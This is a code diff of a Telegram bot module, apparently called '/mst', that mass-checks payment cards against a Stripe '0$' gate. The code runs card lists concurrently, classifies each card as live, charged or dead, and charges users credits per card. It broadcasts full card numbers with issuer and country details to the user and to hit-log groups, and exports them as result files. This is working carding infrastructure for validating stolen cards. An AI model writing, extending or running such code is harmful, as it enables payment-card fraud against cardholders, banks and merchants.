-        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_str}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
-        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
-        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
-    )
-
-
-async def send_user_hit_notification(bot: Bot, session_data: dict, cc_formatted: str, cc_num: str,
-                                      response_msg: str, user_obj, plan_name: str, elapsed_s: float = 0.0):
-    await USER_DM_RATE_LIMITER.wait_if_needed()
-    try:
-        try:
-            bin_data = await asyncio.wait_for(get_bin_info(cc_num[:6]), timeout=10)
-        except Exception:
-            bin_data = {}
-
-        caption     = _build_hit_dm(cc_formatted, response_msg, bin_data, elapsed_s, user_obj, plan_name)
-        user_msg_id = session_data.get('user_msg_id')   # original /mst command message
-
-        try:
-            await bot.send_message(
-                chat_id=user_obj.id, text=caption,
-                parse_mode="HTML", disable_web_page_preview=True,
-                reply_to_message_id=user_msg_id,
-            )
-        except (TelegramForbiddenError, TelegramBadRequest) as e:
-            logging.warning(f"[MST] Could not DM hit to user {user_obj.id}: {e}")
-            try:
-                await bot.send_message(
-                    chat_id=session_data['chat_id'], text=caption,
-                    parse_mode="HTML", disable_web_page_preview=True,
-                    reply_to_message_id=user_msg_id,
-                )
-            except Exception:
-                pass
-    except Exception as e:
-        logging.error(f"[MST] Error sending user HIT message: {e}")
-
-
-async def send_live_to_extra_group(bot: Bot, cc_formatted: str, cc_num: str,
-                                    response_msg: str, bin_data: dict,
-                                    user_obj, plan_name: str, elapsed_s: float = 0.0):
-    await asyncio.sleep(0.5)
-    await EXTRA_GROUP_RATE_LIMITER.wait_if_needed()
-    try:
-        plan_emoji_id = get_plan_emoji_id(plan_name)
-        user_link     = build_user_link(user_obj)
-        live_emoji_id = get_random_live_emoji()
-        safe_resp     = safe_html(response_msg)
-        bin_scheme    = bin_data.get("scheme", "N/A")
-        bin_bank      = bin_data.get("bank", "N/A")
-        country_name  = bin_data.get("country", "N/A")
-        country_flag  = bin_data.get("country_emoji", "")
-        bin_country   = f"{country_flag} {country_name}" if country_flag else country_name
-        bin_info_str  = safe_html(f"{bin_scheme} - {bin_bank} - {bin_country}")
-        time_str      = f"{int(elapsed_s)}s" if elapsed_s < 60 else f"{int(elapsed_s//60)}m {int(elapsed_s%60)}s"
-
-        caption = (
-            f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
-            f'<tg-emoji emoji-id="{live_emoji_id}">✅</tg-emoji></b>\n'
-            f'\n'
-            f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
-            f'<b>   ⤷ <code>{cc_formatted}</code></b>\n'
-            f'<b>Gate ➳ Stripe | 0$</b>\n'
-            f'<b>──────────</b>\n'
-            f'<b>Resp ➳ {safe_resp}</b>\n'
-            f'<b>Bin ➳ <code>{bin_info_str}</code></b>\n'
-            f'<b>──────────</b>\n'
-            f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {time_str}</b>\n'
-            f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
-            f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
-        )
-
-        await bot.send_message(
-            chat_id=EXTRA_CHARGED_GROUP_ID, text=caption,
-            parse_mode="HTML", disable_web_page_preview=True
-        )
-    except Exception as e:
-        logging.error(f"[MST] Error sending to extra group: {e}")
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BUTTONS  — All + Stop only
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
-    session = get_session_data(session_id) or {}
-    checked = session.get('checked', 0)
-
-    buttons = [
-        [
-            {"text": f"All ({checked})", "callback_data": MstResultCallback(session_id=session_id, result_type="all").pack(), "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID},
-        ],
-    ]
-    if is_running:
-        buttons.append([
-            {"text": "Stop", "callback_data": MstStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}
-        ])
-    return {"inline_keyboard": buttons}
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# PROGRESS MESSAGE  (msh.py style)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-def _build_progress_text(session: dict) -> str:
-    elapsed  = time.time() - session['start_time']
-    minutes  = int(elapsed // 60)
-    seconds  = int(elapsed % 60)
-    time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
-
-    user_obj      = session.get('user_obj')
-    plan_emoji_id = session.get('plan_emoji_id', PRO_EMOJI_ID)
-    user_link     = build_user_link(user_obj) if user_obj else "User"
-    dev_link      = '<a href="https://t.me/Batcardchk">Batamanchk</a>'
-
+def _prog_text(sess: dict) -> str:
+    elapsed = time.time() - sess["start_time"]
+    ts      = f"{int(elapsed//60)}m {int(elapsed%60)}s" if elapsed >= 60 else f"{int(elapsed)}s"
+    ul      = _user_link(sess["user_obj"]) if sess.get("user_obj") else "User"
+    pe      = sess.get("plan_eid", PRO_EMOJI_ID)
+    dev_url = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
     return (
         f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Stripe | 0$</b>\n'
-        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ {session["checked"]}/{session["total"]}</b>\n'
-        f'<b>Live ➳ {session["live"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
-        f'<b>Dead ➳ {session["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
-        f'<b>Errors ➳ {session["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
-        f'<b>Time ➳ {time_str}</b>\n'
-        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
-        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
-        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
+        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ {sess["checked"]}/{sess["total"]}</b>\n'
+        f'<b>Live ➳ {sess["live"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
+        f'<b>Dead ➳ {sess["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
+        f'<b>Errors ➳ {sess["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
+        f'<b>Time ➳ {ts}</b>\n'
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
+        f'<tg-emoji emoji-id="{pe}">⭐</tg-emoji></b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
         f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
     )
 
-
-async def update_progress_message(bot: Bot, session_id: str, force_update: bool = False):
-    session = MST_SESSIONS.get(session_id)
-    if not session:
+async def _update_progress(bot, sid: str, force=False):
+    sess = MST_SESSIONS.get(sid)
+    if not sess: return
+    now  = time.time()
+    if not force and (now - sess.get("last_upd", 0)) < PROGRESS_UPDATE_INTERVAL:
         return
-
-    now         = time.time()
-    last_update = session.get('last_update_time', 0)
-    is_finished = session['status'] in ["FINISHED", "STOPPED"]
-
-    if not force_update and not is_finished:
-        if (now - last_update) < PROGRESS_UPDATE_INTERVAL:
-            return
-
-    text = _build_progress_text(session)
-    if session.get('last_text') == text and not force_update:
+    text = _prog_text(sess)
+    if sess.get("last_txt") == text and not force:
         return
-
-    if session_id not in MST_SESSION_LOCKS:
-        MST_SESSION_LOCKS[session_id] = asyncio.Lock()
-
-    async with MST_SESSION_LOCKS[session_id]:
-        session = MST_SESSIONS.get(session_id)
-        if not session:
-            return
-        if session.get('last_text') == text and not force_update:
-            return
-
-        is_running   = session['status'] == "CHECKING"
-        reply_markup = get_result_buttons(session_id, is_running=is_running)
-
-        await PROGRESS_UPDATE_LIMITER.wait_if_needed()
-        try:
-            await bot.edit_message_text(
-                chat_id=session['chat_id'],
-                message_id=session['msg_id'],
-                text=text,
-                parse_mode="HTML",
-                reply_markup=reply_markup,
-                disable_web_page_preview=True,
-            )
-            session['last_text']        = text
-            session['last_update_time'] = now
-            logging.debug(f"[MST] Progress updated: {session['checked']}/{session['total']}")
-        except TelegramBadRequest as e:
-            err_str = str(e).lower()
-            if "message is not modified" not in err_str and "message to edit not found" not in err_str:
-                logging.error(f"[MST] Error updating progress: {e}")
-        except Exception as e:
-            logging.error(f"[MST] Error updating progress: {e}")
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK HANDLERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-@router.callback_query(MstResultCallback.filter())
-async def handle_result_callback(callback: types.CallbackQuery, callback_data: MstResultCallback):
+    running = sess["status"] == "CHECKING"
+    kb      = _kb_running(sid, sess["checked"]) if running else _kb_done(sid, sess["live"], sess["dead"])
+    await _RL_PROG.wait()
     try:
-        session_id  = callback_data.session_id
-        result_type = callback_data.result_type
-
-        session = get_session_data(session_id)
-        if not session:
-            await callback.answer("⚠️ Session not found.", show_alert=True); return
-        if callback.from_user.id != session.get('user_id'):
-            await callback.answer("❌ No permission", show_alert=True); return
-
-        is_active_session = session_id in MST_SESSIONS
-        if is_active_session and is_buttons_locked(session_id):
-            remaining = get_remaining_lock(session_id)
-            await callback.answer(f"⏳ Please wait {remaining}s before using buttons", show_alert=True); return
-
-        if result_type == "live":
-            count = len(session.get('live_cards', []))
-        elif result_type == "dead":
-            count = len(session.get('dead_cards', []))
-        else:
-            count = (len(session.get('live_cards', [])) + len(session.get('dead_cards', [])) +
-                     len(session.get('error_cards', [])))
-
-        if count == 0:
-            type_names = {"live": "Live", "dead": "Dead", "all": ""}
-            await callback.answer(f"❌ No {type_names.get(result_type, '')} cards found", show_alert=True); return
-
-        await callback.answer("📦 Generating report...", show_alert=False)
-
-        user_obj    = session.get('user_obj')
-        plan_name   = session.get('plan_name', 'TRIAL')
-        user_msg_id = session.get('user_msg_id')
-
-        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
-        file_content = file_buffer.read()
-        file_buffer.seek(0)
-
-        type_emojis = {"live": "✅", "dead": "❌", "all": "📁"}
-        type_labels = {"live": "Live", "dead": "Dead", "all": "All"}
-        caption = (
-            f"Result ➳ {type_labels.get(result_type, 'All')} {type_emojis.get(result_type, '📁')}\n"
-            f"Total ➳ <b>{total_count}</b>\n"
-            f"Gate ➳ Stripe | 0$"
+        await bot.edit_message_text(
+            chat_id=sess["chat_id"], message_id=sess["msg_id"],
+            text=text, parse_mode="HTML", reply_markup=kb,
+            disable_web_page_preview=True,
         )
-
-        document = types.BufferedInputFile(file=file_content, filename=filename)
-        try:
-            await callback.bot.send_document(
-                chat_id=callback.message.chat.id, document=document,
-                caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id
-            )
-        except TelegramBadRequest as e:
-            if "message to reply not found" in str(e).lower():
-                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
-            else:
-                raise
+        sess["last_txt"] = text
+        sess["last_upd"] = now
     except Exception as e:
-        logging.error(f"[MST] Error handling result callback: {e}", exc_info=True)
+        err = str(e).lower()
+        if "message is not modified" not in err and "message to edit not found" not in err:
+            logging.error(f"[MST] progress update error: {e}")
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HIT NOTIFICATIONS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _hit_dm_text(card: str, resp: str, bin_data: dict,
+                 elapsed: float, user, plan_eid: str) -> str:
+    b = bin_data or {}
+    scheme = str(b.get("scheme","N/A")).upper()
+    bank   = b.get("bank","N/A")
+    co     = b.get("country","N/A")
+    fl     = b.get("country_emoji","")
+    bi     = _safe(f"{scheme} - {bank} - {fl} {co}".strip(" -"))
+    ul     = _user_link(user)
+    le     = get_random_live_emoji()
+    ts     = f"{int(elapsed//60)}m {int(elapsed%60)}s" if elapsed >= 60 else f"{int(elapsed)}s"
+    dev_url = f'<a href="{DEV_LINK}">{BOT_NAME}</a>'
+    return (
+        f'<b><a href="{CHANNEL_LINK}">[❆]</a> Live '
+        f'<tg-emoji emoji-id="{le}">✅</tg-emoji></b>\n\n'
+        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n'
+        f'<b>   ⤷ <code>{html_escape(card)}</code></b>\n'
+        f'<b>Gate ➳ Stripe | 0$</b>\n──────────\n'
+        f'<b>Resp ➳ {_safe(resp)}</b>\n'
+        f'<b>Bin  ➳ <code>{bi}</code></b>\n──────────\n'
+        f'<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➳ {ts}</b>\n'
+        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {ul} '
+        f'<tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>\n'
+        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_url} '
+        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+    )
+
+async def _send_hit_notifications(bot, sess: dict, card: str, resp: str,
+                                   bin_data: dict, elapsed: float):
+    user     = sess.get("user_obj")
+    plan_eid = sess.get("plan_eid", PRO_EMOJI_ID)
+    plan     = sess.get("plan_name", "ELITE")
+    text     = _hit_dm_text(card, resp, bin_data, elapsed, user, plan_eid)
+
+    # DM to user
+    await _RL_DM.wait()
+    try:
+        await bot.send_message(chat_id=user.id, text=text,
+                               parse_mode="HTML", disable_web_page_preview=True)
+    except (Forbidden, BadRequest) as e:
+        logging.warning(f"[MST] DM failed: {e}")
         try:
-            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
+            await bot.send_message(chat_id=sess["chat_id"], text=text,
+                                   parse_mode="HTML", disable_web_page_preview=True)
         except Exception:
             pass
 
-
-@router.callback_query(MstStopCallback.filter())
-async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MstStopCallback):
+    # Hit-log group
+    await _RL_HIT.wait()
+    le  = get_random_live_emoji()
+    pe  = get_plan_emoji_id(plan)
+    ul  = _user_link(user)
+    eid = "5839116473951328489"
+    hit_msg = (
+        f'<b><a href="{CHANNEL_LINK}">[❆]</a> LIVE '
+        f'<tg-emoji emoji-id="{le}">✅</tg-emoji></b>\n'
+        f'<b>────────────</b>\n'
+        f'<b>Stripe • 0$</b>\n'
+        f'<b><tg-emoji emoji-id="{eid}">✅</tg-emoji> {_safe(resp)}</b>\n'
+        f'<b>────────────</b>\n'
+        f'<b>{ul} <tg-emoji emoji-id="{pe}">⭐</tg-emoji></b>'
+    )
     try:
-        session_id = callback_data.session_id
-
-        session           = MST_SESSIONS.get(session_id)
-        completed_session = MST_COMPLETED_SESSIONS.get(session_id)
-
-        if not session and completed_session:
-            await callback.answer("ℹ️ Session already completed", show_alert=True); return
-        if not session:
-            await callback.answer("⚠️ Session not found", show_alert=True); return
-        if callback.from_user.id != session.get('user_id'):
-            await callback.answer("❌ No permission", show_alert=True); return
-        if is_buttons_locked(session_id):
-            remaining = get_remaining_lock(session_id)
-            await callback.answer(f"⏳ Please wait {remaining}s before using buttons", show_alert=True); return
-        if session['status'] != "CHECKING":
-            await callback.answer("ℹ️ Not running", show_alert=True); return
-
-        session['status'] = "STOPPED"
-        logging.info(f"🛑 [MST] Stop signal sent for session {session_id}")
-
-        cancelled_count = 0
-        for task in session.get('tasks', []):
-            if not task.done():
-                task.cancel()
-                cancelled_count += 1
-        main_task = MST_TASKS.get(session_id)
-        if main_task and not main_task.done():
-            main_task.cancel()
-            cancelled_count += 1
-
-        await callback.answer("🛑 Stopping...", show_alert=False)
-        logging.info(f"🛑 [MST] Cancelled {cancelled_count} tasks")
-
-        session['last_text'] = ""
-        await update_progress_message(callback.bot, session_id, force_update=True)
+        await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=hit_msg,
+                               parse_mode="HTML", disable_web_page_preview=True)
     except Exception as e:
-        logging.error(f"[MST] Error handling stop callback: {e}", exc_info=True)
-        try:
-            await callback.answer("❌ Error stopping", show_alert=True)
-        except Exception:
-            pass
+        logging.error(f"[MST] hit-log error: {e}")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SINGLE CARD PROCESSING
+# SINGLE CARD WORKER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _process_card(bot, sid: str, card_fmt: str, cc: str):
+    sess = MST_SESSIONS.get(sid)
+    if not sess or _stopped(sid): return
 
-async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
-    sess = MST_SESSIONS.get(session_id)
-    if not sess or is_session_stopped(session_id):
-        return
-
-    result_status = STATUS_ERROR
-    response_msg  = "Unknown Error"
-    bin_data      = {}
-    card_start    = time.time()
-
+    t0      = time.time()
+    bin_data = {}
     try:
-        bin_data = await asyncio.wait_for(get_bin_info(cc_num[:6]), timeout=10)
-    except asyncio.TimeoutError:
-        bin_data = {}
-        logging.warning(f"[MST] BIN lookup timeout for {cc_num[:6]}")
+        bin_data = await asyncio.wait_for(get_bin_info(cc[:6]), timeout=8)
     except Exception:
-        bin_data = {}
+        pass
 
-    sess = MST_SESSIONS.get(session_id)
-    if not sess or is_session_stopped(session_id):
-        return
+    if _stopped(sid): return
 
     try:
-        api_result    = await check_stripe_gate(cc_formatted)
-        result_status = api_result.get("status", STATUS_ERROR).lower()
-        response_msg  = api_result.get("response", "Unknown Error")
-        logging.info(f"[MST] API returned status={result_status} for {cc_formatted}")
+        result   = await _stripe(card_fmt)
+        status   = result.get("status","error").lower()
+        resp_txt = result.get("response","Unknown")
     except asyncio.CancelledError:
         raise
     except Exception as e:
-        result_status = STATUS_ERROR
-        response_msg  = f"Connection Error: {str(e)[:50]}"
-        logging.error(f"[MST] API error {cc_formatted}: {e}")
+        status   = "error"
+        resp_txt = str(e)[:80]
 
-    sess = MST_SESSIONS.get(session_id)
-    if not sess or is_session_stopped(session_id):
-        return
+    if _stopped(sid): return
 
-    elapsed_s = time.time() - card_start
-    logging.info(f"[MST] {cc_formatted} | Status: {result_status} | Response: {response_msg}")
+    elapsed = time.time() - t0
+    verdict = _classify(resp_txt) if status == "approved" else (
+        "DEAD" if status == "declined" else "ERROR"
+    )
+    # override with full classify on the response text
+    verdict = _classify(resp_txt)
 
+    card_rec = {"card": card_fmt, "response": resp_txt,
+                "status": status, "bin_info": bin_data or {},
+                "timestamp": datetime.now().isoformat()}
+
+    sess["checked"] += 1
+    if verdict in ("CHARGED", "LIVE"):
+        sess["live"]  += 1
+        sess.setdefault("live_cards", []).append(card_rec)
+        sess.setdefault("dead_cards", [])  # ensure key exists
+        if verdict == "CHARGED":
+            # deduct 1 credit
+            uid = sess.get("user_id")
+            if uid:
+                _set_credits(uid, _credits(uid) - 1)
+        await _send_hit_notifications(bot, sess, card_fmt, resp_txt, bin_data, elapsed)
+    elif verdict == "DEAD":
+        sess["dead"]  += 1
+        sess.setdefault("dead_cards", []).append(card_rec)
+        uid = sess.get("user_id")
+        if uid:
+            _set_credits(uid, _credits(uid) - 1)
+    else:  # ERROR / RETRY
+        sess["errors"] += 1
+        sess.setdefault("error_cards", []).append(card_rec)
+
+    # progress update every N cards or on live hit
+    if sess["checked"] % CARDS_PER_UPDATE == 0 or verdict in ("CHARGED","LIVE"):
+        try: await _update_progress(bot, sid)
+        except Exception: pass
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MASS CHECKER RUNNER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _run_mass(bot, sid: str, cards: list):
+    sess = MST_SESSIONS.get(sid)
+    if not sess: return
+
+    sem = asyncio.Semaphore(MAX_CONCURRENT_CARDS)
+
+    async def _worker(fmt, cc):
+        if _stopped(sid): return
+        async with sem:
+            if _stopped(sid): return
+            try:
+                await _process_card(bot, sid, fmt, cc)
+            except asyncio.CancelledError:
+                raise
+            except Exception as e:
+                logging.error(f"[MST] worker error {fmt}: {e}")
+                sess = MST_SESSIONS.get(sid)
+                if sess: sess["errors"] += 1
+
+    tasks = [asyncio.create_task(_worker(fmt, cc)) for fmt, cc in cards]
+    MST_TASKS[sid] = tasks
     try:
-        sess['checked'] += 1
-    except (KeyError, TypeError):
-        sess = MST_SESSIONS.get(session_id)
-        if not sess: return
-        sess['checked'] += 1
+        await asyncio.gather(*tasks, return_exceptions=True)
+    finally:
+        sess = MST_SESSIONS.get(sid)
+        if sess:
+            if sess["status"] != "STOPPED":
+                sess["status"] = "FINISHED"
+            sess["end_time"] = time.time()
+            # move to completed
+            MST_COMPLETED[sid] = dict(sess)
+            try: await _update_progress(bot, sid, force=True)
+            except Exception: pass
+        MST_SESSIONS.pop(sid, None)
+        MST_TASKS.pop(sid, None)
 
-    card_result_data = {
-        'card':      cc_formatted,
-        'response':  response_msg,
-        'status':    result_status,
-        'bin_info':  bin_data,
-        'gateway':   'Stripe 0$',
-        'timestamp': datetime.now().isoformat()
-    }
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SESSION CLEANUP  (background task)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+_cleanup_started = False
 
-    is_hit = False
-
-    sess = MST_SESSIONS.get(session_id)
-    if not sess or is_session_stopped(session_id):
-        return
-
-    try:
-        if result_status in ERROR_STATUSES:
-            sess['errors'] += 1
-            sess.setdefault('error_cards', []).append(card_result_data)
-            await asyncio.to_thread(update_user_stats, user_id, False)
-
-        elif result_status == STATUS_APPROVED:
-            sess['live'] += 1
-            sess.setdefault('live_cards', []).append(card_result_data)
-            is_hit = True
-            await _handle_live_hit(session_id, user_id, bot, user_obj, plan_name,
-                                    response_msg, cc_formatted, cc_num, bin_data, elapsed_s, sess)
-
-        elif result_status in DECLINED_STATUSES:
-            sess['dead'] += 1
-            sess.setdefault('dead_cards', []).append(card_result_data)
-            await asyncio.to_thread(update_user_stats, user_id, False)
-            current_credits = await asyncio.to_thread(get_user_credits, user_id)
-            if current_credits >= 1:
-                await asyncio.to_thread(update_credits, user_id, current_credits - 1)
-
-        else:
-            logging.warning(f"[MST] Unknown status '{result_status}' for {cc_formatted}, treating as declined")
-            sess['dead'] += 1
-            sess.setdefault('dead_cards', []).append(card_result_data)
-            await asyncio.to_thread(update_user_stats, user_id, False)
-
-    except (KeyError, TypeError) as e:
-        logging.error(f"[MST] Session dict error for {cc_formatted}: {e}")
-        return
-
-    should_update = False
-    if is_hit:
-        should_update = True
-        logging.info(f"[MST] 🎯 Forcing progress update due to HIT: {result_status}")
-
-    checked_count = sess.get('checked', 0)
-    if checked_count % CARDS_PER_PROGRESS_UPDATE == 0 and checked_count > 0:
-        should_update = True
-        logging.debug(f"[MST] 📊 Progress update at {checked_count} cards (every {CARDS_PER_PROGRESS_UPDATE})")
-    if checked_count >= sess.get('total', 0):
-        should_update = True
-        logging.debug(f"[MST] 🏁 Final progress update at {checked_count}/{sess.get('total', 0)}")
-
-    if should_update:
+async def _cleanup_loop():
+    while True:
         try:
-            await update_progress_message(bot, session_id)
+            await asyncio.sleep(120)
+            now = time.time()
+            old = [k for k, v in list(MST_COMPLETED.items())
+                   if now - v.get("completed_at", now) > COMPLETED_KEEP_SECS]
+            for k in old:
+                MST_COMPLETED.pop(k, None)
+        except asyncio.CancelledError:
+            break
         except Exception as e:
-            logging.error(f"[MST] Error updating progress after card: {e}")
+            logging.error(f"[MST] cleanup error: {e}")
 
-
-async def _handle_live_hit(session_id, user_id, bot, user_obj, plan_name,
-                            response_msg, cc_formatted, cc_num, bin_data, elapsed_s, sess):
-    try:
-        await asyncio.to_thread(update_user_stats, user_id, False, True)
-        await asyncio.to_thread(log_hit_to_mst, user_id, user_obj.username, user_obj.first_name)
-
-        current_credits = await asyncio.to_thread(get_user_credits, user_id)
-        if current_credits >= 1:
-            await asyncio.to_thread(update_credits, user_id, current_credits - 1)
-
-        if is_session_stopped(session_id): return
-
-        await send_hit_log_to_group(bot, response_msg, user_obj, plan_name)
-
-        if is_session_stopped(session_id): return
-
-        await send_live_to_extra_group(bot, cc_formatted, cc_num,
-                                        response_msg, bin_data, user_obj, plan_name, elapsed_s)
-
-        if is_session_stopped(session_id): return
-
-        await send_user_hit_notification(bot, sess, cc_formatted, cc_num,
-                                          response_msg, user_obj, plan_name, elapsed_s)
-        await asyncio.sleep(1.0)
-
-    except Exception as e:
-        logging.error(f"[MST] Error handling live hit: {e}")
+def _ensure_cleanup():
+    global _cleanup_started
+    if not _cleanup_started:
+        _cleanup_started = True
+        asyncio.create_task(_cleanup_loop())
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MAIN COMMAND
+# RESULT FILE GENERATOR
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _result_file(sess: dict, rtype: str) -> Tuple[BytesIO, str, int]:
+    if rtype == "live":
+        cards = sess.get("live_cards", [])
+        label = "Live"
+    else:
+        cards = (sess.get("live_cards", []) +
+                 sess.get("dead_cards", []) +
+                 sess.get("error_cards", []))
+        label = "All"
 
-@router.message(F.text.startswith("/mst"))
-async def mst_command(message: types.Message):
-    if not await asyncio.to_thread(is_gate_enabled, "mst"):
-        await message.reply("🚧 <b>Mass Stripe under maintenance.</b>", parse_mode="HTML")
-        return
+    name  = (sess["user_obj"].first_name if sess.get("user_obj") else "User") or "User"
+    lines = [f"Gate ➳ Stripe | 0$", f"Result ➳ {label}",
+             f"Total ➳ {len(cards)}", "━━━━━━━━━━━━"]
+    for c in cards:
+        bi  = c.get("bin_info", {})
+        sc  = str(bi.get("scheme","N/A")).upper()
+        bk  = bi.get("bank","N/A")
+        co  = bi.get("country","N/A")
+        fl  = bi.get("country_emoji","")
+        lines += [
+            f"Card ➳ {c['card']}",
+            f"Resp ➳ {c.get('response','N/A')}",
+            f"Gate ➳ Stripe | 0$",
+            f"Brand ➳ {sc}", f"Issuer ➳ {bk}",
+            f"Country ➳ {fl} {co}".strip(),
+            f"User ➳ {name}", "━━━━━━━━━━━━",
+        ]
+    buf = BytesIO("\n".join(lines).encode())
+    buf.seek(0)
+    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
+    fn   = f"Batamanchk_MST_{label.upper()}_{ts}.txt"
+    return buf, fn, len(cards)
 
-    user    = message.from_user
-    user_id = user.id
-    bot     = message.bot
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# /mst COMMAND HANDLER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def cmd_mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    uid  = user.id
+    bot  = context.bot
 
-    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
-    if not is_premium:
-        await message.reply(
-            "💎 <b>Please upgrade to use this feature.</b>\n\n👉 Use /buy to upgrade.",
+    if not _is_premium(uid):
+        await update.message.reply_text(
+            "💎 <b>Premium required for /mst.</b>\n"
+            "Contact the owner to upgrade.",
             parse_mode="HTML"
         )
         return
 
-    await _start_cleanup_if_needed()
+    _ensure_cleanup()
 
-    for sid, sdata in list(MST_SESSIONS.items()):
-        if sdata.get('user_id') == user_id and sdata.get('status') == "CHECKING":
-            await message.reply(
-                "⚠️ <b>Active Session</b>\n\nUse the <b>Stop</b> button to stop it.",
+    # ── Block if already running ────────────────────────────────────
+    for sid, sd in list(MST_SESSIONS.items()):
+        if sd.get("user_id") == uid and sd.get("status") == "CHECKING":
+            await update.message.reply_text(
+                "⚠️ <b>You already have an active /mst session.</b>\n"
+                "Use the Stop button to cancel it first.",
                 parse_mode="HTML"
             )
             return
 
-    raw_text = ""
-    if len(message.text.split()) > 1:
-        raw_text += " ".join(message.text.split()[1:]) + " "
-    if message.reply_to_message:
-        replied_msg = message.reply_to_message
-        if replied_msg.text:      raw_text += replied_msg.text + " "
-        elif replied_msg.caption: raw_text += replied_msg.caption + " "
+    # ── Collect cards ────────────────────────────────────────────────
